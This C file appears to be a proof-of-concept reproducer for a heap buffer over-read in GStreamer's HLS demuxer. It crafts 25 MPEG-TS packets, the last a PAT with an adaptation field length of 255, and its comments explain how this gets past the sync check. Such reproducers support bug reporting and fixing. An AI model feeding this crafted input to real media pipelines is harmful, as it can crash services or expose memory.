#include <gst/gst.h>
#include "gsthlsdemux.h"

GstDebugCategory *gst_hls_demux_debug;

int
main (int argc, char **argv)
{
  gst_init (&argc, &argv);
  GST_DEBUG_CATEGORY_INIT (gst_hls_demux_debug, "hlsdemux", 0, "hlsdemux repro");

  GstHLSTSReader r;
  gst_hlsdemux_tsreader_init (&r);
  gst_hlsdemux_tsreader_set_type (&r, GST_HLS_TSREADER_MPEGTS);

  /* One exact 188-byte MPEG-TS packet (r.packet_size defaults to 188):
   *   byte0 = 0x47 (sync byte)
   *   byte1 = 0x00 (TEI=0, PID top bits = 0)
   *   byte2 = 0x00 (PID low bits = 0 -> PID 0x0000, i.e. PAT)
   *   byte3 = 0x30 (adaptation_field_control bits set: bit 0x10 matches the
   *                 caller's PAT dispatch mask, bit 0x20 sets handle_pat's
   *                 own "has_adaptation_field" check)
   *   byte4 = 0xFF (adaptation_field_len = 255, attacker-controlled)
   * handle_pat() then does `data = p+4; data += 1 + p[4]` = p + 4 + 1 + 255 =
   * p + 260 - already 72 bytes past this 188-byte packet/buffer - then
   * immediately reads `data[0]` for the pointer_field, `data[0]`/`data[6]`/
   * `data[7]`/GST_READ_UINT16_BE(data+1) for table_id/section_length, all at
   * or beyond p+260: a heap-buffer-overflow READ. */
  /* find_offset()/have_ts_sync() require CLAMP(size/188, 25, 100) consecutive
   * valid-looking TS packet headers before trusting any offset - a single
   * packet is not enough. Provide exactly 25 packets (188*25 = 4700 bytes):
   * 24 harmless filler packets (PID 0x1FFF, payload-only, no adaptation
   * field) followed by one crafted malicious PAT packet (PID 0) as the last
   * packet, so its OOB jump (up to ~260 bytes from ITS OWN start) lands past
   * the end of this 4700-byte buffer. */
  const gsize n_packets = 25;
  const gsize packet_size = 188;
  gsize total = n_packets * packet_size;
  guint8 *ts = g_malloc0 (total);

  for (gsize i = 0; i < n_packets - 1; i++) {
    guint8 *p = ts + i * packet_size;
    p[0] = 0x47;
    p[1] = 0x1F;                /* PID top bits = 0x1F -> PID 0x1FFF (null) */
    p[2] = 0xFF;
    p[3] = 0x10;                /* adaptation_field_control = payload only */
  }
  {
    guint8 *p = ts + (n_packets - 1) * packet_size;
    p[0] = 0x47;
    p[1] = 0x00;
    p[2] = 0x00;                /* PID = 0 -> PAT */
    p[3] = 0x30;                /* has_adaptation_field + caller's dispatch bit */
    p[4] = 0xFF;                /* adaptation_field_len = 255 */
  }

  GstBuffer *buf = gst_buffer_new_and_alloc (total);
  gst_buffer_fill (buf, 0, ts, total);
  g_free (ts);

  GstClockTime first_pcr, last_pcr;
  GstTagList *tags = NULL;

  g_print ("calling gst_hlsdemux_tsreader_find_pcrs() on a crafted 188-byte "
      "PAT packet with adaptation_field_len=255...\n");
  gboolean ret =
      gst_hlsdemux_tsreader_find_pcrs (&r, &buf, &first_pcr, &last_pcr,
      &tags);
  g_print ("gst_hlsdemux_tsreader_find_pcrs returned %d (should have "
      "crashed/been flagged before this line if the bug fired)\n", ret);

  if (tags)
    gst_tag_list_unref (tags);
  gst_buffer_unref (buf);
  gst_deinit ();
  return 0;
}
